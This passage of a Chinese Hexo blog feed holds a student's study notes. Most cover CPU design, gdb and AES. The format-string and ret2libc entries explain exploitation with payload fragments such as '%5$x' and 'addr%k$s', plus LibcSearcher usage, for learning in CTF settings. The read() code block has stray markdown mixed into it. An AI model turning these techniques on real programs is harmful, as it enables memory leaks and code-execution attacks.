    <content type="html"><![CDATA[<blockquote><p>WHU《计算机设计实践》课程实验</p></blockquote><p>使用工具：<br>Rars : risc-v汇编和运行时模拟器<br>ModelSim<br>vivado</p><p>编程语言：<br>Verilog<br>assembly</p><hr><h1 id="零基础扫盲"><a href="#零基础扫盲" class="headerlink" title="零基础扫盲"></a>零基础扫盲</h1><h2 id="什么是FPGA-Field-Programmable-Gate-Array-？"><a href="#什么是FPGA-Field-Programmable-Gate-Array-？" class="headerlink" title="什么是FPGA(Field Programmable Gate Array)？"></a>什么是FPGA(Field Programmable Gate Array)？</h2><p>FPGA，即<strong>现场可编程门阵列</strong>，是一种可完成通用功能的<strong>可编程逻辑芯片</strong>，即可以对其进行编程实现某种逻辑处理功能。</p><h2 id="FPGA与Verilog"><a href="#FPGA与Verilog" class="headerlink" title="FPGA与Verilog"></a>FPGA与Verilog</h2><p>Verilog用于描述和设计数字电路的功能和结构。设计者使用Verilog编写代码，定义电路的行为和连接方式。<br>编写完成的Verilog代码需要经过综合(Synthesis)，转化为门级网表（Netlist），然后进行布局布线（Place and Route），完成布局布线后，所有的逻辑单元和连接将被转化为特定的配置数据，这些数据用于配置FPGA的硬件资源。这些配置数据将会被保存为一个比特流文件（.bit文件），这个文件包含了所有FPGA硬件资源的配置指令，可以在FPGA上加载并执行。</p><h2 id="Vivado与ModelSim"><a href="#Vivado与ModelSim" class="headerlink" title="Vivado与ModelSim"></a>Vivado与ModelSim</h2><p>Vivado是 集成设计环境<br>ModelSim 具有强大的仿真功能</p><hr><h1 id="参考示例："><a href="#参考示例：" class="headerlink" title="参考示例："></a>参考示例：</h1><p>单周期CPU，支持14条指令</p><ul><li>add sub xor or and srl sra sll</li><li>lui addi lw</li><li>sw beq jal<br>单周期CPU ModelSim 仿真工程SCCPU_SIM<br>测试代码rv32_sc_sim.dat</li></ul><p>流水线CPU，支持12条指令</p><ul><li>add sub xor or and srl sra sll</li><li>lui addi lw</li><li>sw<br>流水线CPU ModelSim 仿真工程 PLCPU_SIM<br>测试代码rv32_pl_sim.dat</li></ul><hr><h1 id="示例工程及源码"><a href="#示例工程及源码" class="headerlink" title="示例工程及源码"></a>示例工程及源码</h1><p>\CODExp\demo\sccpu_sim\project\SCCPU_SIM：实现了14条指令单周期CPU的ModelSim示例工程<br>\CODExp\demo\sccpu_sim\source\ ：目录包含14条指令单周期CPU的ModelSim仿真代码<br>\CODExp\demo\sccpu_fpga\source\： 目录包含了14条指令单周期CPU的Vivado仿真代码及约束文件（在此基础上可以直接构建Vivado工程）</p><p>\CODExp\testcode\demo\目录包含示例单周期CPU和流水线CPU工程的测试代码（asm、dat文件）<br>\CODExp\testcode\task\目录包含设计目标单周期CPU和流水线CPU工程的测试代码（asm、dat或coe文件）</p><hr><h1 id="实验一——单周期CPU"><a href="#实验一——单周期CPU" class="headerlink" title="实验一——单周期CPU"></a>实验一——单周期CPU</h1><p>对示例单周期CPU进行指令扩展，至少支持以下指令<br>add sub xor or and srl sra sll<br>lui addi lw sw beq jal<br>&#x3D;&#x3D;增加指令<br>slt sltu andi ori xori<br>srli srai slli slti sltui<br>bne bge bgeu blt bltu jalr&#x3D;&#x3D;</p><hr><p>可能出现的问题：</p><ol><li>文件路径<br>全英文</li><li>文件找不到<br>最好用copy</li></ol><hr><h1 id="RARS使用"><a href="#RARS使用" class="headerlink" title="RARS使用"></a>RARS使用</h1><p><a href="https://github.com/TheThirdOne/rars/wiki">Home · TheThirdOne&#x2F;rars Wiki</a></p><hr><h1 id="ModelSim使用"><a href="#ModelSim使用" class="headerlink" title="ModelSim使用"></a>ModelSim使用</h1><hr><p><code>chardet</code> 是一个用于自动检测文本数据编码格式的 Python 库。它可以识别多种字符编码，如 UTF-8、GBK、ISO-8859-1 等，广泛应用于处理不同编码格式的文本数据时，帮助开发者避免乱码问题。</p><p><strong>安装：</strong></p><p>可以通过 <code>pip</code> 安装 <code>chardet</code>：</p><p>bash</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">pip install chardet<br></code></pre></td></tr></table></figure><hr><p>vscode<br><a href="https://blog.csdn.net/weixin_62701327/article/details/136499646">如何在VSCode中优雅地书写Verilog_vscode verilog-CSDN博客</a></p><p><img src="/2024/10/29/hello-world/20250307160846465.png"></p>]]></content>
    
    
    <categories>
      
      <category>计组</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>gdb操作</title>
    <link href="/2025/02/28/gdb%E6%93%8D%E4%BD%9C/"/>
    <url>/2025/02/28/gdb%E6%93%8D%E4%BD%9C/</url>
    
    <content type="html"><![CDATA[<p>gdb pwngdb pwbdbg操作<br>hex</p><h2 id="x命令"><a href="#x命令" class="headerlink" title="x命令"></a>x命令</h2><p>GDB的<code>x</code>命令用于<strong>直接查看内存内容</strong></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">x/[选项] &lt;内存地址或表达式&gt;<br>x/[重复次数][格式][单位大小] [地址]<br></code></pre></td></tr></table></figure><p><strong>重复次数</strong><br>指定连续多少个内存单元<br><code>x/4xw</code>：以16进制格式(<code>x</code>)显示4个<code>word</code>（<code>w</code>）（4字节）的数据</p><p><strong>格式</strong></p><table><thead><tr><th>格式字符</th><th>说明</th></tr></thead><tbody><tr><td><code>x</code></td><td>十六进制</td></tr><tr><td><code>d</code></td><td>十进制有符号数</td></tr><tr><td><code>u</code></td><td>十进制无符号数</td></tr><tr><td><code>o</code></td><td>八进制</td></tr><tr><td><code>t</code></td><td>二进制（位模式）</td></tr><tr><td><code>c</code></td><td>ASCII字符</td></tr><tr><td><code>s</code></td><td>C风格字符串（以<code>\0</code>结尾）</td></tr><tr><td><code>i</code></td><td>反汇编指令</td></tr></tbody></table><p><strong>单位大小</strong></p><table><thead><tr><th>字符</th><th>大小</th><th>说明</th></tr></thead><tbody><tr><td><code>b</code></td><td>1字节</td><td>Byte（8位）</td></tr><tr><td><code>h</code></td><td>2字节</td><td>Half-word（16位）</td></tr><tr><td><code>w</code></td><td>4字节</td><td>Word（32位系统默认）</td></tr><tr><td><code>g</code></td><td>8字节</td><td>Giant-word（64位系统默认）</td></tr></tbody></table><p>地址或表达式<br>可以是变量名、寄存器（<code>$rip</code>、<code>$rsp</code>）、直接地址（<code>0x400000</code>）或表达式(<code>&amp;var</code>)</p><hr>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>gcc编译链接操作</title>
    <link href="/2025/02/27/gcc%E7%BC%96%E8%AF%91%E9%93%BE%E6%8E%A5%E6%93%8D%E4%BD%9C/"/>
    <url>/2025/02/27/gcc%E7%BC%96%E8%AF%91%E9%93%BE%E6%8E%A5%E6%93%8D%E4%BD%9C/</url>
    
    <content type="html"><![CDATA[<p>编译成汇编文件(intel风格)</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">gcc -S -masm=intel sample.c -o sample.s<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>格式化字符串漏洞</title>
    <link href="/2025/02/26/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/"/>
    <url>/2025/02/26/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<blockquote><p>参考：<br><a href="https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-exploit/">利用 - CTF Wiki</a></p></blockquote><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p><em>格式化字符串函数</em></p><blockquote><p>可以接受可变数量的参数，</p></blockquote><p>将第一个参数作为格式化字符串，根据其来解析之后的参数。<br>通俗来讲，格式化字符串函数就是将计算机内存中表示的数据转化为我们人类可读的字符串。</p><p>几乎所有的C&#x2F;C++程序都会利用格式化字符串函数来<strong>输出信息、调试程序、处理字符串</strong>。<br>一般来说，格式化字符串在利用的时候主要分为三个部分：</p><ul><li>格式化字符串函数</li><li>格式化字符串</li><li>后续参数，可选</li></ul><p>example:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Color %s, Number %d, Float %4.2f&quot;</span>, <span class="hljs-string">&quot;red&quot;</span>, <span class="hljs-number">123456</span>, <span class="hljs-number">3.14</span>)<br></code></pre></td></tr></table></figure><p>在进入printf函数之前的栈布局：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs prolog">[stack bottom / high address]<br>...<br><span class="hljs-number">3.14</span><br><span class="hljs-number">123456</span><br>addr of <span class="hljs-string">&quot;red&quot;</span><br>addr of format string: <span class="hljs-symbol">Color</span> <span class="hljs-comment">%s...</span><br>[stack top / low address]<br></code></pre></td></tr></table></figure><p>在进入printf之后，函数首先获取第一个参数，一个一个读取其字符会遇到两种情况</p><ul><li>当前字符不是%，直接输出到响应标准输出</li><li>当前字符是%，继续读取下一个字符<ul><li>如果下一个字符是%，输出%</li><li>如果没字符，报错，也可能仍运行输出%【gcc version 11.4.0 (Ubuntu 11.4.0-1ubuntu1~22.04)】</li><li>如果有其它字符则根据字符，获取相应的参数，对其进行解析并输出</li></ul></li></ul><p>但是如果我们写成了这个样子:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Color %s, Number %d, Float $4.2f&quot;</span>);<br></code></pre></td></tr></table></figure><p>此时我们可以发现我们并没有提供参数，那么程序会如何运行呢？<br>程序仍然会运行，而且会将栈上存储格式化字符串地址的高地址方向的三块相应大小的内存区域分别解析为</p><ol><li>解析其地址(内存中的值)对应的字符串</li><li>解析其内容(内存中的值)对应的整型值</li><li>解析其内容(内存中的值)对应的浮点值</li></ol><p>对于2，3来说倒也无妨，<br>但是对于1来说，若内存块中的值是一个不可访问的地址，比如0，那么程序就会因此而崩溃。</p><h1 id="如何利用"><a href="#如何利用" class="headerlink" title="如何利用"></a>如何利用</h1><p>在上一部分，我们已经看到了格式化字符串漏洞的两个利用手段</p><ul><li>使程序崩溃，因为栈上方（高地址&#x2F;栈底）的内存处存到的地址大概率不可访问，利用<code>%s</code></li><li>查看进程内容，利用<code>%d</code>，<code>%f</code>输出栈上的内容</li></ul><h2 id="利用手段之泄漏内存"><a href="#利用手段之泄漏内存" class="headerlink" title="利用手段之泄漏内存"></a>利用手段之<em>泄漏内存</em></h2><p>获取我们所想要的内容</p><ul><li>泄漏栈内存<ul><li>获取某个变量的值   <code>%d</code></li><li>获取某个变量对应地址的内存 <code>%s</code></li></ul></li><li>泄漏任意地址内存<ul><li>利用GOT表得到libc函数地址，进而获取libc，进而获取其它libc函数地址</li><li>盲打，dump整个程序，获取有用的信息。</li></ul></li></ul><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mel">%n$x<br>%&lt;位置&gt;$&lt;格式&gt;<br>%5$x<br></code></pre></td></tr></table></figure><p><code>%n</code> 表示要访问第<code>n</code>个参数（位置参数，整数）（输出函数的第n+1个参数）<br><code>$x</code> 指定以16进制格式输出该参数的值<br><code>%5$x</code> 表示以十六进制输出第5个参数（输出函数的第6个参数）的值</p><blockquote><p>[!tip] Sum up</p><ol><li>利用<code>%x</code>来获取对应栈的内存，但建议使用<code>%p</code>,可以不用考虑位数的区别</li><li>利用<code>%s</code>来获取变量所对应地址的内容，只不过有零截断</li><li>利用<code>%order$x</code>来获取指定参数的值，利用<code>%order$s</code>来获取指定参数对应地址的内容</li></ol></blockquote><hr><h1 id="泄漏任意地址内存"><a href="#泄漏任意地址内存" class="headerlink" title="泄漏任意地址内存"></a>泄漏任意地址内存</h1><p>控制我们所要泄漏的变量的地址</p><p>获取某个指定地址addr的内容</p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cos">addr<span class="hljs-built_in">%k</span><span class="hljs-built_in">$s</span><br></code></pre></td></tr></table></figure><hr><p>格式符</p><table><thead><tr><th>格式符</th><th>用途</th></tr></thead><tbody><tr><td><code>%d</code></td><td>十进制有符号整数</td></tr><tr><td><code>%u</code></td><td>十进制无符号整数</td></tr><tr><td><code>%x</code></td><td>十六进制</td></tr><tr><td><code>%o</code></td><td>八进制</td></tr><tr><td><code>%f</code></td><td>浮点数</td></tr><tr><td><code>%e</code></td><td>科学计数法</td></tr><tr><td><code>%c</code></td><td>单个字符</td></tr><tr><td><code>%p</code></td><td>指针地址，支持ascii或转义字符（<code>\n</code>)</td></tr><tr><td><code>%s</code></td><td>字符串，需以<code>\0</code>结尾，否则可能越界</td></tr><tr><td><code>%n</code></td><td><strong>写入已输出的字符数</strong></td></tr></tbody></table><hr><p><img src="/2024/10/29/hello-world/e-20250226224707861.png"></p><p><a href="https://blog.csdn.net/Mr_Fmnwon/article/details/135757524">【PWN · 格式化字符串|劫持fini_array|劫持got表】[CISCN 2019西南]PWN1-CSDN博客</a></p><blockquote><p>本文在一定程度上参考了各种推文、wiki</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>库函数与系统调用</title>
    <link href="/2024/12/07/libc/"/>
    <url>/2024/12/07/libc/</url>
    
    <content type="html"><![CDATA[<blockquote><p>介绍pwn中常见的libc函数</p></blockquote><p>库函数与系统调用</p><h1 id="atoi"><a href="#atoi" class="headerlink" title="atoi()"></a>atoi()</h1><p><strong>标准库函数</strong></p><blockquote><p>ASCII to Integer<br>将字符串转换为对应的整数值</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">atoi</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* str)</span>;<br></code></pre></td></tr></table></figure><h1 id="read"><a href="#read" class="headerlink" title="read()"></a>read()</h1><p><em><strong>系统调用</strong></em></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">read</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">void</span>* buf, <span class="hljs-type">size_t</span> count)</span>;<br>  <br>这样，你可以在程序运行时动态地分析 **glibc** 中的函数调用和行为。<br><br>### <span class="hljs-number">5.</span> **查看已经安装的库路径**<br><br>如果你对已经安装的 **glibc** 二进制文件中的实现感兴趣，虽然不能直接看到源代码，但可以使用工具来反汇编并分析其二进制```<br><br>---<br><span class="hljs-meta"># mmap()</span><br>`mmap`是一个用于内存映射的系统调用函数，在Linux和Unix-like系统中非常常见。它允许将一个文件或其他对象（设备、内存等）映射到进程的虚拟内存空间<br>可以通过<br>指针直接访问文件内容，无需读取和写入文件<br>```c<br><span class="hljs-type">void</span>* <span class="hljs-title function_">mmap</span><span class="hljs-params">(<span class="hljs-type">void</span>* addr, <span class="hljs-type">size_t</span> length, <span class="hljs-type">int</span> flags, <span class="hljs-type">int</span> fd, <span class="hljs-type">off_t</span> offset)</span>;<br></code></pre></td></tr></table></figure><p>addr：建议的映射地址。如果传入NULL，操作系统会自动选择映射的地址<br>length：映射区域的长度，单位是字节<br>prot：指定映射区域的访问权限，通常是以下几个值的组合：</p><ul><li>PROT_READ：页可以被读取</li><li>PROT_WRITE：页可以被写入</li><li>PROT_EXEC：页可以被执行</li><li>PROT_NONE：页不能被访问<br>flags：映射的特性和行为，常见的值有：</li><li>MAP_SHARED：修改同步到文件或设备，适用于共享内存</li><li>MAP_PRIVATE：修改不会影响文件或设备，而是创建一个映射的副本，适用于私有内存</li><li>MAP_FIXED：如果映射地址已经有映射区域，它会被替换</li><li>MAP_ANONYMOUS：映射不与任何文件关联，通常用于申请匿名内存，<code>fd</code>必须为-1，offset也必须为0</li><li>fd：文件描述符，指向需要映射的文件。如果映射匿名内存，传入-1</li><li>offset：文件偏移量，表示映射内容在文件中的起始位置，映射必须是页大小的整数倍。</li></ul><hr><h1 id="阅读glibc源代码"><a href="#阅读glibc源代码" class="headerlink" title="阅读glibc源代码"></a>阅读glibc源代码</h1><p>通过<code>libc</code>库文件本身，无法直接查看其源代码。<br><code>libc</code>文件（<code>libc.so</code>或<code>libc.so.6</code>）是已经编译好的共享库，它们包含了库的二进制实现。</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>glibc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>AES</title>
    <link href="/2024/11/26/AES/"/>
    <url>/2024/11/26/AES/</url>
    
    <content type="html"><![CDATA[<blockquote><p>密码学实验</p></blockquote><h1 id="AES算法的基本结构"><a href="#AES算法的基本结构" class="headerlink" title="AES算法的基本结构"></a>AES算法的基本结构</h1><p>输入：128位明文，128&#x2F;192&#x2F;256位密钥</p><p>子过程： </p><ol><li>S盒变换</li><li>行移位</li><li>列混合</li><li>轮密钥加</li></ol><p>输出： 128位密文</p><h1 id="AES算法的基本运算"><a href="#AES算法的基本运算" class="headerlink" title="AES算法的基本运算"></a>AES算法的基本运算</h1><ol><li><p>$GF(2^8)$上的加法</p></li><li><p>$GF(2^8)上的多项式加法$</p></li><li><p>$GF(2^8)上的乘法$</p><ol><li><p>借助xtime运算快速实现</p><ul><li>倍乘函数：移位运算（定义：${02} \cdot {??}$）</li><li>加法：异或运算<br> 由于$GF(2^8)$中的所有元素都可以表示为02的不同幂次的和，因此所有的乘法运算都能够通过重复调用北城函数和加法快速实现<br> 例：({}中表示16进制)<br> $$<br> \begin{aligned}<br> y \cdot {15} &amp;&#x3D;y\cdot {01 \oplus 04 \oplus 10} &#x3D; y\cdot {01 \oplus 02^2 \oplus 02^4}<br> \<br> &amp;&#x3D; y\oplus xtime(xtime(y)) \oplus xtime(xtime(xtime(xtime(y))))<br> \<br> &amp;&#x3D; y \oplus xtime(xtime(y\oplus xtime(xtime(y))))<br> \end{aligned}<br> $$<br> 更快速的方法：<br> 造表：将128所有乘法结果取值与计算，存入表中，直接查表</li></ul></li><li><p>借助生成元快速实现<br> $GF(2^8)$的全体<strong>非零元素</strong>对于 <em>乘法</em> 构成<strong>循环群</strong>。设$a$为<strong>生成元</strong>，则循环群<br> $G &#x3D; {a^0, a^1, … a^{254}}$<br> G中的乘法运算：<br> $a^p \cdot a^q &#x3D; a^{(p+q) mod 255}$<br> 于是可以把$GF(2^8)$上的乘法运算简化为整数的加法运算。</p><p> <em>零元素</em>00与任何元素相乘都得00</p></li></ol></li></ol><h1 id="编程实现"><a href="#编程实现" class="headerlink" title="编程实现"></a>编程实现</h1><ol><li>造表</li></ol>]]></content>
    
    
    <categories>
      
      <category>密码学</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>codeQL一命速通</title>
    <link href="/2024/11/12/codeQL/"/>
    <url>/2024/11/12/codeQL/</url>
    
    <content type="html"><![CDATA[<p>CodeQL能干啥：<br>编写查询。。。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">codeql database create ~/CodeQL/databases/codeql_demo --language=<span class="hljs-string">&quot;python&quot;</span> --source-root=<br></code></pre></td></tr></table></figure><p>CodeQL采用类似SQL的查询语言，但专为代码分析设计。</p><p>其语法主要围绕从代码中提取信息的操作，包括对象选择、路径探索和条件过滤。</p><p>CodeQL查询通常由以下几个部分组成：</p><ul><li>from：选择数据源，指定查询的对象</li><li>where：条件过滤，用于限制结果</li><li>select：返回查询的结果</li><li>order by：对结果进行排序</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ql">import javascript <br><br>//查找不安全的SQL查询<br>from DataFlow::Node source, DataFlow::Node sink<br>where <br>//选择通过用户<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>静态分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>伪随机</title>
    <link href="/2024/11/12/%E4%BC%AA%E9%9A%8F%E6%9C%BA/"/>
    <url>/2024/11/12/%E4%BC%AA%E9%9A%8F%E6%9C%BA/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>DSBCTF-做不出来的签到题</title>
    <link href="/2024/11/12/DSBCTF-%E5%81%9A%E4%B8%8D%E5%87%BA%E6%9D%A5%E7%9A%84%E7%AD%BE%E5%88%B0%E9%A2%98/"/>
    <url>/2024/11/12/DSBCTF-%E5%81%9A%E4%B8%8D%E5%87%BA%E6%9D%A5%E7%9A%84%E7%AD%BE%E5%88%B0%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>😭😭😭 做不出来签到</p>]]></content>
    
    
    <categories>
      
      <category>WP</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>发送字节码和字符串的区别</title>
    <link href="/2024/11/09/%E5%8F%91%E9%80%81%E5%AD%97%E8%8A%82%E7%A0%81%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E5%8C%BA%E5%88%AB/"/>
    <url>/2024/11/09/%E5%8F%91%E9%80%81%E5%AD%97%E8%8A%82%E7%A0%81%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E5%8C%BA%E5%88%AB/</url>
    
    <content type="html"><![CDATA[<blockquote><p>ISCTF - girlfriend</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>io</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python语法之模块化编程</title>
    <link href="/2024/11/06/python%E8%AF%AD%E6%B3%95%E4%B9%8B%E6%A8%A1%E5%9D%97%E5%8C%96%E7%BC%96%E7%A8%8B/"/>
    <url>/2024/11/06/python%E8%AF%AD%E6%B3%95%E4%B9%8B%E6%A8%A1%E5%9D%97%E5%8C%96%E7%BC%96%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<p><code>import</code></p><p><code>from ... import ... </code></p><p><code>from ... import ... as ...</code></p>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>令我困惑的一题：返回地址应该填啥？</title>
    <link href="/2024/11/05/%E4%BB%A4%E6%88%91%E5%9B%B0%E6%83%91%E7%9A%84%E4%B8%80%E9%A2%98%EF%BC%9A%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80%E5%BA%94%E8%AF%A5%E5%A1%AB%E5%95%A5%EF%BC%9F/"/>
    <url>/2024/11/05/%E4%BB%A4%E6%88%91%E5%9B%B0%E6%83%91%E7%9A%84%E4%B8%80%E9%A2%98%EF%BC%9A%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80%E5%BA%94%E8%AF%A5%E5%A1%AB%E5%95%A5%EF%BC%9F/</url>
    
    <content type="html"><![CDATA[<blockquote><p>总结：不囫囵吞枣，gdb调试见真知</p></blockquote><p>平台：buuctf<br> 题目：jarvisoj_test_your_memory<br>hexo</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>stack</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>再探GOT&amp;PLT及延迟绑定</title>
    <link href="/2024/11/04/%E5%86%8D%E6%8E%A2GOT-PLT%E5%8F%8A%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/"/>
    <url>/2024/11/04/%E5%86%8D%E6%8E%A2GOT-PLT%E5%8F%8A%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/</url>
    
    <content type="html"><![CDATA[<p>之前刚学完GOT&amp;PLT及延迟绑定，转头用的时候就感觉变得有点陌生，<br>看来还是得把详细的过程和分析总结写下来呀。</p><p>先挖个坑，有空就写</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>程序</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ret2libc</title>
    <link href="/2024/11/04/ret2libc/"/>
    <url>/2024/11/04/ret2libc/</url>
    
    <content type="html"><![CDATA[<p>hexo</p><h3 id="什么样的题是ret2libc，这类题该怎么做？"><a href="#什么样的题是ret2libc，这类题该怎么做？" class="headerlink" title="什么样的题是ret2libc，这类题该怎么做？"></a>什么样的题是ret2libc，这类题该怎么做？</h3><p>程序的特征是：<br><strong>能</strong>进行栈<strong>溢出</strong>，没有<code>system</code>函数，也没有<code>&quot;/bin/sh&quot;</code>参数<br>无法进行常规的ret2text<br>ret2libc的关键是获取libc的版本，所以需要获得<code>libc.so</code>中函数的偏移量，<br>所以<strong>需要</strong>一个<strong>输出函数</strong>，<code>.got.plt</code>中需要有<strong>libc中的函数</strong>，我们才能获取到libc中函数的<strong>真实地址</strong></p><p>从而利用<strong>LibcSearcher</strong>确定libc版本</p><hr><p>LibcSearcher原理？<br>基地址范围？</p><hr><p>前置知识：<br>libc中有<code>system</code>函数，而<code>libc.so</code>动态偏移链接库中的函数之间的相对偏移是固定的</p><p>ALSR保护不会随机内存地址的后12位（后3个字节）</p><p><code>pwntools</code>基本语法：<br><code>elf.got()</code>返回的是<code>.got</code>中函数 相对plt基地址的偏移量<br><code>elf.plt()</code>返回的是<code>.plt</code>中函数 相对got基地址的偏移量</p><hr><h1 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h1><p><code>write()</code>函数是C标准库（libc）中的一个系统调用，常用于向文件描述符写入数据：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">write</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> count)</span>;<br></code></pre></td></tr></table></figure><h6 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h6><ol><li><code>fd</code> ：目标文件描述符<br>常见：</li></ol><ul><li><code>0</code>：标准输入</li><li><code>1</code>：标准输出</li><li><code>2</code>：标准错误输出</li><li><code>open</code>系统调用获取文件描述符</li></ul><ol start="2"><li><code>buf</code>：源数据缓冲区</li><li><code>count</code>：要写入的<strong>字节数</strong></li></ol><h6 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h6><ul><li>成功 返回写入的字节数</li><li>失败 返回-1</li></ul><hr><h1 id="LibcSearcher"><a href="#LibcSearcher" class="headerlink" title="LibcSearcher"></a>LibcSearcher</h1><h6 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h6><p>原版接口</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>obj = LibcSearcher(<span class="hljs-string">&quot;fgets&quot;</span>,<span class="hljs-number">0x7ff39014bd90</span>)  <span class="hljs-comment"># 使用一个已知符号地址作为初始约束，初始化LibcSearcher</span><br>obj.add_condition(<span class="hljs-string">&quot;atoi&quot;</span>, <span class="hljs-number">218528</span>)  <span class="hljs-comment"># 添加一个约束条件</span><br>obj.dump(<span class="hljs-string">&quot;printf&quot;</span>)  <span class="hljs-comment"># 根据已有约束条件，查询某个符号在Libc中的地址(偏移量)</span><br></code></pre></td></tr></table></figure><p>新增接口</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">len</span>(obj)  <span class="hljs-comment"># 返回在当前约束条件下，可能的Libc数量</span><br><span class="hljs-built_in">print</span>(obj)  <span class="hljs-comment"># 若Libc已被唯一确定，打印其详细信息</span><br><br><span class="hljs-keyword">for</span> libc <span class="hljs-keyword">in</span> obj:<br><span class="hljs-built_in">print</span>(libc)  <span class="hljs-comment"># 实现了迭代器，打印（或其他操作）当前所有可能的Libc</span><br><br>obj.select_libc()  <span class="hljs-comment"># 打印可能的Libc列表，手动选择一个认为正确的Libc</span><br>obj.select_libc(<span class="hljs-number">2</span>)  <span class="hljs-comment"># 